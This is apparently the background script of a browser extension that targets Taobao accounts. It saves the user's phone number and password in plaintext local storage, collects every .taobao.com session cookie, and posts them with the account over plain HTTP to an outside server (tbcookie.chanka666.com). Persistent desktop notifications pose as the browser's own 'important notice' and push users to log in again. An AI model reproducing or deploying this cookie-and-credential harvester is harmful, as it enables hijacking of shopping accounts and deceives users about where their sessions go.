function getBrowserInfo() {
    var ua = navigator.userAgent.toLocaleLowerCase();
    var browserType = '2345/谷歌/极速';
    if (ua.match(/msie/) != null || ua.match(/trident/) != null) {
        browserType = "IE";
        browserVersion = ua.match(/msie ([\d.]+)/) != null ? ua.match(/msie ([\d.]+)/)[1] : ua.match(/rv:([\d.]+)/)[1];
    } else if (ua.match(/firefox/) != null) {
        browserType = "火狐";
    } else if (ua.match(/ubrowser/) != null) {
        browserType = "UC";
    } else if (ua.match(/opera/) != null) {
        browserType = "欧朋";
    } else if (ua.match(/bidubrowser/) != null) {
        browserType = "百度";
    } else if (ua.match(/metasr/) != null) {
        browserType = "搜狗";
    } else if (ua.match(/lbbrowser/) != null) {
        browserType = "猎豹";
    } else if (ua.match(/2345explorer/) != null) {
        browserType = "2345";
    } else if (ua.match(/you123/) != null) {
        browserType = "you123";
    } else if (ua.match(/115browser/) != null) {
        browserType = "115";
    } else if (ua.match(/37abc/) != null) {
        browserType = "37abc";
    } else if (ua.match(/tencenttraveler/) != null || ua.match(/qqbrowse/) != null) {
        browserType = "QQ";
    } else if (ua.match(/maxthon/) != null) {
        browserType = "遨游";
    } else if (ua.match(/chrome/) != null) {
        var is360 = _mime("type", "application/vnd.chromium.remoting-viewer");

        function _mime(option, value) {
            var mimeTypes = navigator.mimeTypes;
            for (var mt in mimeTypes) {
                if (mimeTypes[mt][option] == value) {
                    return true;
                }
            }
            return false;
        }

        if (is360) {
            browserType = '360';
        } else {
            $('html').css("zoom", ".80");
        }
    } else if (ua.match(/safari/) != null) {
        browserType = "Safari";
    }

    return browserType;
}

var BrowserName = getBrowserInfo();
// 非手机号账号配置
var accountObj = []

function queryName(){
  return new Promise((resolve, reject) => {
    $.get('http://tbcookie.chanka666.com/getCustomAccount', '', function (params) {
      var res = JSON.parse(params)
      accountObj = res.taoBaoAccounts
      resolve(res)
    }).error(function (err) {
      console.log(err);
      reject(err)
    })
  })
}
queryName()
// 监听来自content-script的消息
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    // console.log('收到来自content-script的消息：');
    // console.log(request, sender, sendResponse);
    let str = '';
    let phone = window.localStorage.getItem('account') || request.account;
    let password = window.localStorage.getItem('password') || request.password;
    console.log(phone);
    if (request.account && isPhone(phone, accountObj)) {
        let pass = '1';
        if (password && password.length >= 0) {
            pass = '+-' + password;
        }
        str = phone + pass + '+-' + JSON.stringify(accountObj);
    }
    if (request.sendStart) {
        if (!request.tbAccount) {
            str = '请登录'
        } else {
            str = '插件正常运行中,' + phone;
            chrome.notifications.getAll(function (object, notifications) {
                var variable;
                for (variable in object) {
                    chrome.notifications.clear(variable)
                }
            })
        }
    }
    if (request.break) {
        str = '插件：请输入手机号登录，或重试';
    }
    sendResponse(str);
    GetCookie()
        .then(res => {
            // 获取淘宝账号
            if (request.account && isPhone(request.account, accountObj)) {
                window.localStorage.setItem('account', request.account);
                if (request.password && request.password.length >= 6) {
                    window.localStorage.setItem('password', request.password)
                }
            }
            if (request.tbAccount && request.tbAccount.trim()) {
                window.localStorage.setItem('tbAccount', request.tbAccount)
            }

            // 请服务器发送淘宝账号和淘宝cookie
            let formData = {
                taoBaoAccount: window.localStorage.getItem('account'),
                taoBaoCookie: res
            };


            // 获取获取到是淘宝页面之后再发送请求
            console.log(formData);
            let strTbAccount = window.localStorage.getItem('tbAccount') ? `【账号：${request.tbAccount}】` : '';
            if (request.sendStart) {
                formData.taoBaoAccount = window.localStorage.getItem('account');
                let str = formData.taoBaoAccount ? `【${formData.taoBaoAccount}】` : '' + strTbAccount;
                // 判断是不是手机号
                if (!isPhone(formData.taoBaoAccount, accountObj) || !request.tbAccount) {
                    _showDataOnPage('您的淘宝号' + str + '出现异常或没有登录，请重新登录');
                    return false;
                }
                // 测试先把请求注释掉
                postRequest(formData)
                    .then(res1 => {
                        let date = new Date();
                        console.log(res1, '成功', date);
                        if (res1 == 'false') {
                            _showDataOnPage('您的淘宝号' + str + '已经掉线，请重新登录')
                        }
                    })
                    .catch(err => {
                        _showDataOnPage('您的淘宝号' + str + '出现异常，请输入手机号进行登录')
                        console.log(res, err, '错误 ' + new Date());
                    })
            }
        })
});

function GetCookie() {
    return new Promise(resolve => {
        chrome.cookies.getAll({'domain': '.taobao.com'}, function (cookie) {
            let arr = [];
            cookie.forEach(item => {
                if (item.domain === '.taobao.com' || item.domain === '.i.taobao.com') {
                    let str = item.name + '=' + item.value;
                    arr.push(str)
                }
            });
            let cookieStr = arr.join(';');
            resolve(cookieStr);
        });
    })

}

// get 请求
function getRequest(data) {
    return new Promise((resolve, reject) => {
        $.get('http://tbcookie.chanka666.com/TaoBaoCookieInterface', data, function (params) {
            resolve(params);
        }).error(function (err) {
            reject(err)
        })
    })
}

// post
function postRequest(data) {
    return new Promise((resolve, reject) => {
        $.post('http://tbcookie.chanka666.com/TaoBaoCookieInterface', JSON.stringify(data), function (params) {
            resolve(params);
        }).error(function (err) {
            reject(err)
        })
    })
}

function _showDataOnPage(data) {
    let close_time = 2 * 1000 * 60 * 60;
    //显示一个桌面通知
    if (window.webkitNotifications) {
        var notification = window.webkitNotifications.createNotification(
            'img/icon.png',  // icon url - can be relative
            BrowserName + '浏览器重要通知!',  // notification title
            data,  // notification body text
            'requireInteraction' //手动关闭
        );
        notification.show();
        // 设置3秒后，将桌面通知dismiss   // 自动关闭  注释掉 登录成功就会关闭
        // setTimeout(function(){notification.cancel();}, close_time);

    } else if (chrome.notifications) {
        var opt = {
            type: 'basic',
            title: BrowserName + '浏览器重要通知!',
            message: data,
            iconUrl: 'img/icon.png',
            // buttons: [{title:'点击此按钮直接去登录'}],
            requireInteraction: true //手动关闭
        }
        // 自动关闭  注释掉 登录成功就会关闭
        chrome.notifications.create('', opt, function (id) {
            // setTimeout(function(){
            // chrome.notifications.clear(id, function(){});
            // }, close_time);
        });

        // chrome.notifications.onButtonClicked.addListener((notificationId,index)=>{
        //
        //     console.log(notificationId,index); //当前通知的ID和当前点击按钮的index
        // });
    } else {
        alert(data);
    }

}


// 后台popup
function testBackground() {
    let obj = {};
    obj.phone = window.localStorage.getItem('account');
    obj.phone = obj.phone ? obj.phone.split(',')[0] : '';
    obj.taoBaoAccount = window.localStorage.getItem('taoBaoAccount');
    console.log(obj);
    return obj;
}
